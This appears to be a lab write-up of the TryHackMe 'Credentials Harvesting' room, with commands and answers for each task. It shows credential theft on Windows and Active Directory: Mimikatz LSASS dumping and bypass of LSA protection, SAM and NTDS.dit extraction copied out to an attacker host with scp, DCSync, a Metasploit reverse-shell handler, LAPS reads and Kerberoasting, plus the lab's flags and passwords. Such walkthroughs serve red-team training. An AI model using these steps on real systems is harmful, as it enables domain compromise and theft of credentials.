![image](https://github.com/user-attachments/assets/d1dfcece-13a2-4988-888a-b219368dddce)![image](https://github.com/user-attachments/assets/2fb2c90e-77fb-422e-9387-b6d976b7a251)


# Credentials Harvesting
  Apply current authentication models employed in modern environments to a red team approach.

TryHackMe room [link](https://tryhackme.com/room/credharvesting)

<br>

## Task 1 : Introduction

- **What** is Credentials Harvesting?
    - Extracting login details (usernames, passwords) from systems via:
      - `Clear-text` files
      - `Registry` entries
      - `Memory dumps`
      - `SAM` database
      - `Windows Credentials Manager`

- **Why** Harvest Credentials?
  - **Lateral Movement:** Access other systems in the network.
  - **Stealth:** Legitimate credentials reduce detection risk.
  - **Persistence:** Create/manage accounts for long-term access.

**Objectives:**
- Extract credentials from the Windows SAM database.
- Dump clear-text passwords and Kerberos tickets from memory (locally/remotely).
- Exploit Windows Credentials Manager.
- Harvest credentials from Domain Controllers (`DCs`).
- Enumerate Local Administrator Password Solution (`LAPS`).
- Explore AD-specific attacks for credential theft.



<br>

## Task 2 : Credentials Harvesting
   
  Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look 
for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials.

  _"Steal credentials → Move laterally → Stay hidden."_

In this task we simply need to start the machine.. 


<br>


## Task 3 : Credential Access
Credential access is where adversaries may find credentials in compromised systems and gain access to user credentials. It helps adversaries to reuse them or impersonate the identity of 
a user. This is an important step for lateral movement and accessing other resources such as other applications or systems. Obtaining legitimate user credentials is preferred rather than 
exploiting systems using CVEs.


  In this task we have to find credentials stored insecurely in `Windows Registry` and `Active Directory` (AD) user descriptions.

> Workflow...

### 1: Windows Registry
Command:
    
      reg query HKLM /f password /t REG_SZ /s

- Explanation:
    - Searches the Local Machine (`HKLM`) registry hive for the keyword "flag".
    - `/t` REG_SZ: Limits results to string values.
    - `/s`: Recursively searches all subkeys.
  
  ![image](https://github.com/user-attachments/assets/aa636589-ea0c-48a2-8ef5-ae196920bf14)

- Alternative (Current User Hive):

      reg query HKCU /f flag /t REG_SZ /s
  
### 2: AD User Description
Command (PowerShell):

      Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description -ne $null} | Select-Object Name, Description
      
- Explanation:
  - Lists all AD users with non-empty descriptions.

![image](https://github.com/user-attachments/assets/7d7e4eff-703f-4f76-aa5a-696780677765)


Look for passwords or sensitive info in the Description field.

<br>

## _Answers_

Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry?
    
      7tyh4ckm3
      
Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
  
      Passw0rd!@#

<br>

## Task 4: Local Windows Credentials

  This task covers methods to extract local Windows credentials stored in the SAM database, including:

1. **Metasploit's** hashdump: Dumps hashes from memory (`LSASS`).
2. **Volume Shadow Copy:** Creates a backup of the `SAM` file while Windows is running.
3. **Registry Hives:** Extracts `SAM/SYSTEM` files from the registry for offline decryption.

> Files Needed:
- **SAM:** Contains user hashes (encrypted).
- **SYSTEM:** Contains the boot key to decrypt the SAM.


> Workflow...

### 1: Volume Shadow Copy (Manual)
- Create a Shadow Copy:

      wmic shadowcopy call create Volume='C:\'

  ![image](https://github.com/user-attachments/assets/1005a73f-d248-4e04-b288-c3815711274b)


- Verify with:

      vssadmin list shadows

  ![image](https://github.com/user-attachments/assets/715d5b92-65a7-4f13-b3b9-950325ecc5ba)

Note the Shadow Copy Volume path (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`).

- Copy SAM & SYSTEM Files:

      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\\users\thm\Desktop\system

  ![image](https://github.com/user-attachments/assets/796ad428-a9ee-4429-9383-1e9cee0897e6)


- Transfer to AttackBox (e.g., with `SCP`):

      scp root@ATTACKER_IP:C:\sam .
      scp root@ATTACKER_IP:C:\system .
  
- Decrypt with Impacket:

      python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL
  
     - Output:

              Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
              NTLM Hash: 98d3a787a80d08385cea7fb4aa2a4261

### 2: Registry Hives (Alternative)
- Export SAM & SYSTEM from Registry:

      reg save HKLM\sam C:\sam-reg
      reg save HKLM\system C:\system-reg
  
- Decrypt with Impacket (same as above).

### 3: Metasploit hashdump (Quick)
- Get Meterpreter Shell (if not already):

      use exploit/multi/handler
      set payload windows/x64/meterpreter/reverse_tcp
      exploit
  
- Dump Hashes:

        meterpreter > hashdump
    - Output: Same as Method 1.
 

<br>

## _Answers_

Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?

      98d3a787a80d08385cea7fb4aa2a4261
      

> TO FIND
- For this, I started with checking the shadow copy..
   
       vssadmin list shadows

- After this, I copied both, sam & system files..

      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\thm\Desktop\sam
      copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\\users\thm\Desktop\system         

  ![image](https://github.com/user-attachments/assets/3f8bbaf0-e482-4486-ae2f-24f43bd7c57b)

  

  Now, we got our self the copies of both files.

  ![image](https://github.com/user-attachments/assets/065227a1-bfbf-45f7-b53b-ae8579425ee6)


- Now, we need to move these files to our Attacker Machine, so I simply used scp for file transfer..

        scp sam root@10.10.90.246:/root/.

  ![image](https://github.com/user-attachments/assets/bb813a5c-859a-4386-91fe-3ebf30cd6fc8)


  Simillarly, I used the same command again by just changing the file name..

      scp system root@10.10.90.246:/root/.

  ![image](https://github.com/user-attachments/assets/9c0dcb28-777a-4d25-9be8-2aea3fe53772)


  We can see the files in our attack machine.
  
  ![image](https://github.com/user-attachments/assets/7aeb6599-4410-4e80-b701-3295a0b7fee8)


- Now, It's time to decrypt with Impacket:

      python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL

![image](https://github.com/user-attachments/assets/e9948ea5-8e8a-4fa3-90ba-c8cba6c0d7ec)


So, we can our NTLM hash..


     


  
<br>      


## Task 5: LSASS Memory Dumping
**Objective:** Extract credentials (NTLM hashes, Kerberos tickets, clear-text passwords) from the LSASS process memory.


- What is LSASS?
    - Windows process managing security policies and caching credentials (hashes, tickets) for logged-in users.
    - Target for attackers to escalate privileges or move laterally.
- Methods to Dump LSASS Memory:
  - GUI (Task Manager):
    - Right-click lsass.exe → "Create dump file" → Analyze offline.
  - Command-Line (ProcDump):
  
        procdump.exe -accepteula -ma lsass.exe C:\dump.dmp
    
  - Mimikatz (Direct Extraction):
  
        privilege::debug          # Enable debug privileges
        sekurlsa::logonpasswords  # Dump cached credentials
  
- LSA Protection (Mitigation):
  - Microsoft’s defense to block LSASS memory access.
- Enabled via registry:

      reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

- Bypass with Mimikatz:
  
      !+                          # Load mimidrv.sys kernel driver
      !processprotect /process:lsass.exe /remove  # Disable LSA protection
      sekurlsa::logonpasswords    # Now works!
  
### How It Works in Practice
- Dump LSASS Memory:
  - Use procdump or Task Manager to create a snapshot (lsass.dmp).

- Analyze Offline:
  - Transfer the dump to your attack machine.
    
- Use Mimikatz/Impacket to extract hashes:

        python3 /opt/impacket/examples/secretsdump.py -security lsass.dmp LOCAL

- Bypass LSA Protection:
  - If sekurlsa::logonpasswords fails with "Access Denied (0x00000005)":
  - Load Mimikatz’s kernel driver (!+).
  - Disable protection (!processprotect).
  - Retry dumping.
 


<br>

## _Answers_
Is the LSA protection enabled? (Y|N)
          
          Y
        

<br>


## Task 6 : Windows Credential Manager

**Objective:** Extract stored credentials (usernames/passwords) from Windows Credential Manager using:

  - vaultcmd (built-in)
  - cmdkey (built-in)
  - runas /savecred (abuse saved credentials)
  - Mimikatz (memory dumping)

> Workflow...

### 1. Enumerate Stored Credentials

- List all vaults:

      vaultcmd /list

  ![image](https://github.com/user-attachments/assets/fb466436-6e7e-4124-8418-5965f2932d69)

- Check credentials in a vault (e.g., Web Credentials):

      vaultcmd /listcreds:"Web Credentials"

  - output:
    
    <pre>
    
      Resource: internal-app.thm.red  
      Identity: THMUser  
    
    </pre>
      
  ![image](https://github.com/user-attachments/assets/fbb68950-73d9-4839-a3f1-a8d26b04a0d9)

  
  
### 2. Extract Clear-Text Passwords

  - PowerShell (Get-WebCredentials.ps1):
    
        Import-Module C:\Tools\Get-WebCredentials.ps1
        Get-WebCredentials
    
      - Output:
      <pre>
        
          UserName  Resource             Password
          --------  --------             --------
          THMUser   internal-app.thm.red E4syPassw0rd
      
      </pre>  

    ![image](https://github.com/user-attachments/assets/58125d63-2dcc-4826-b6d0-d55c1260374f)

  - Mimikatz (Memory Dump):

        !+
        !processprotect /process:lsass.exe /remove
        privilege::debug
        sekurlsa::credman
    
  Extracts clear-text passwords cached in memory.
  
![image](https://github.com/user-attachments/assets/19b42709-8228-4a4b-a9ff-c45c30923a68)


### 3. Abuse runas /savecred
  
  - List saved credentials:

          cmdkey /list

    ![image](https://github.com/user-attachments/assets/233e1ea7-1710-4928-b296-6f9043d2e77b)

  - Execute commands as another user:


        runas /savecred /user:THM.red\thm-local cmd.exe

    ![image](https://github.com/user-attachments/assets/14037829-26f4-4843-8804-a146bc7927ed)

  - Then read the flag:

        type "c:\Users\thm-local\Saved Games\flag.txt"

    ![image](https://github.com/user-attachments/assets/854ac5b5-eaad-4143-8298-7064e2dba91f)


<br>

## _Answers_

Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?

          
          E4syPassw0rd
        
Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?

          jfxKruLkkxoPjwe3

Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?

          THM{RunA5S4veCr3ds}



<br>



## Task 7: Dumping Domain Controller Hashes

  This task covers two methods to extract NTDS.dit (Active Directory database) hashes from a Domain Controller:

> Method.
1. Local Dumping (No Credentials)
    - Requires administrative access to the DC.
    - Uses ntdsutil to create a backup of NTDS.dit, SYSTEM, and SECURITY files.
    - Extracts hashes using Impacket's secretsdump.py.
2. Remote Dumping (With Credentials - DC Sync Attack)
    - Requires domain admin (or equivalent) credentials.
    - Uses secretsdump.py to remotely pull hashes via DRSUAPI (DC Sync).
    - Can crack extracted NTLM hashes with Hashcat (-m 1000).

> Workflow..
### 1. Local Dumping (If You Have Admin Access to DC)

1. Dump `NTDS.dit`, `SYSTEM`, and `SECURITY` files

       powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

     -  Files will be saved in `C:\temp\Active Directory\ntds.dit` and `C:\temp\registry\SYSTEM` & `SECURITY`.
       
  ![image](https://github.com/user-attachments/assets/616e013e-638e-46fc-9b47-0fe19669327e)


2. Transfer Files to Attacker Machine

    - Use `scp`, `smb`, or another method to move files to your Kali/AttackBox.

           scp C:\temp\Active Directory\ntds.dit root@10.10.90.246:/root/.

     ![image](https://github.com/user-attachments/assets/7d2153cd-ea7a-4b80-aa5f-d647e28230bc)

    simillarly, for `SYSTEM` and `SECURITY`..

        scp C:\temp\registry\SYSTEM root@10.10.90.246:/root/.
        scp C:\temp\registry\SECURITY root@10.10.90.246:/root/.

     ![image](https://github.com/user-attachments/assets/3bf2ec8a-0e0b-42d0-a665-c1c28c253c90)

4. Extract Hashes with `Impacket`

        python3 secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
   
    - Boot Key will be displayed in the output (needed for decryption).

    ![image](https://github.com/user-attachments/assets/e6bd2af2-c7b9-4a82-9921-f76eb8803714)

6. Find the `bk-admin` Password

  - Search the dumped hashes for `bk-admin`'s `NTLM` hash.
  
  ![image](https://github.com/user-attachments/assets/11abfee0-ed1c-4879-beb5-f03b3ab8b860)

  - Crack it with `Hashcat`:

        hashcat -m 1000 bk-admin_ntlm_hash /usr/share/wordlists/rockyou.txt

    ![image](https://github.com/user-attachments/assets/24e3a94f-9650-4b1d-98ef-a1d8200fc428)

### 2. Remote DC Sync (If You Have Credentials)
- Run `secretsdump.py` with Admin Credentials

      python3 secretsdump.py -just-dc thm.red/thm@<DC_IP> -outputfile hashes.txt

    This dumps all domain hashes (including bk-admin).

- Find `bk-admin`'s Hash

  - Open hashes.txt and locate the line:

        thm.red\bk-admin:1106:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::

  - Crack the `NTLM` Hash

        hashcat -m 1000 [NTLM_HASH] /usr/share/wordlists/rockyou.txt
    



<br>

## _Answers_

Apply the technique discussed in this task to dump the NTDS file locally and extract hashes. What is the target system bootkey value? Note: Use thm.red/thm as an Active Directory user since it has administrator privileges!

          
          0x36c8d26ec0df8b23ce63bcefa6e2d821

![image](https://github.com/user-attachments/assets/b898620a-d73c-472a-b27b-61438e90f06f)

        
What is the clear-text password for the `bk-admin` username?

          Passw0rd123

![image](https://github.com/user-attachments/assets/4fe92bbe-55bc-4fb9-8634-1cc6fa8039b1)



<br>



## Task 8 : Local Administrator Password Solution (LAPS)

  `LAPS` replaces the insecure Group Policy Preferences (`GPP`) method for managing local admin passwords. 
- Instead of storing passwords in SYSVOL (vulnerable to decryption), LAPS stores them in two AD attributes:
    - `ms-mcs-AdmPwd` → Cleartext password of the local admin.
    - `ms-mcs-AdmPwdExpirationTime` → Password expiration time.
 
> Workflow..

### 1. Check if LAPS is Installed
- Look for AdmPwd.dll in:

      dir "C:\Program Files\LAPS\CSE"

  ![image](https://github.com/user-attachments/assets/29961d8e-b9cb-4acb-b676-119fc7c60754)


### 2. Find Who Can Read LAPS Passwords
- Use Find-AdmPwdExtendedRights to find groups with access:

      Find-AdmPwdExtendedRights -Identity <OU>  


     - Output:

            THM\LAPsReader

  ![image](https://github.com/user-attachments/assets/ed6079a0-2117-48b3-86b4-94645255e5af)

### 3. Identify Users in the Privileged Group

- Check members of THMGroupReader:

      net groups "LAPsReader"
      
    - Output:

          bk-admin
      
    ![image](https://github.com/user-attachments/assets/1e66f8cb-591d-4a55-a071-8dcf92314a2e)
 
### 4. Get LAPS Password (If You Have Access)
- Use Get-AdmPwdPassword as a privileged user (e.g., bk-admin):

      Get-AdmPwdPassword -ComputerName CREDS-HARVESTIN
    
    -  Output:

            Password: THMLAPSPassw0rd

      ![image](https://github.com/user-attachments/assets/0e708f56-0b59-441d-827a-233901dc96c5)



<br>

## _Answers_

Which group has ExtendedRightHolder and is able to read the LAPS password?

      LAPsReader
      
  ![image](https://github.com/user-attachments/assets/f80cf5de-5219-4018-8de8-edb08820e26c)


Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer?


      THMLAPSPassw0rd
      
  ![image](https://github.com/user-attachments/assets/3e1e182a-86c9-40cd-bbef-179b310686bb)

Which user is able to read LAPS passwords?

      bk-admin  

  ![image](https://github.com/user-attachments/assets/ce543bd4-9f3f-43a3-8aad-ad1fa6d53344)



<br>


## Task 9: Kerberoasting Attack Walkthrough

> Objective:
1. Enumerate SPN (Service Principal Name) accounts using GetUserSPNs.py.
2. Perform Kerberoasting to get a TGS ticket for the SPN account.
3. Crack the TGS ticket to get the plaintext password.

### 1: Enumerate SPN Accounts
- Run the following command to list all SPN accounts in the domain:

      python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.234.58 THM.red/thm

    Enter password: Passw0rd! (as given in the task).

   - Output:
      <pre>
      
        ServicePrincipalName          Name     MemberOf  PasswordLastSet
        ----------------------------  -------  --------  --------------------------
        http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  
      
      </pre>  

     ![image](https://github.com/user-attachments/assets/19f2ccdb-3cc5-4df1-8166-74733b0467a5)

Service Principal Name (SPN):  http/creds-harvestin.thm.red 

### 2: Request TGS Ticket (Kerberoasting)
- Now, request a TGS ticket for the SPN user (svc-user):

      python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.234.58 THM.red/thm -request-user svc-user
   - Output:

          $krb5tgs$23$*svc-thm$THM.RED$http/creds-harvestin.thm.red*$8f5de4211da1cd5715217[...]7bfa3680658dd9812ac061c5

  ![image](https://github.com/user-attachments/assets/e845b264-a62f-4019-90f7-d636f3539f13)

  Save this hash to a file (e.g., spn.hash).


### 3: Crack the TGS Ticket with Hashcat
- Use Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23):

      hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

![image](https://github.com/user-attachments/assets/bedd56ce-3668-4269-a3d2-90323b8fe2ad)


<br>

## _Answers_


Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?

        svc-thm
  ![image](https://github.com/user-attachments/assets/c1d0af4b-e1df-409d-858c-16c7786c9266)

      
After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?

      Passw0rd1

  ![image](https://github.com/user-attachments/assets/ba7e78d4-4310-416c-a59a-5ad398decbd2)

  


<br>



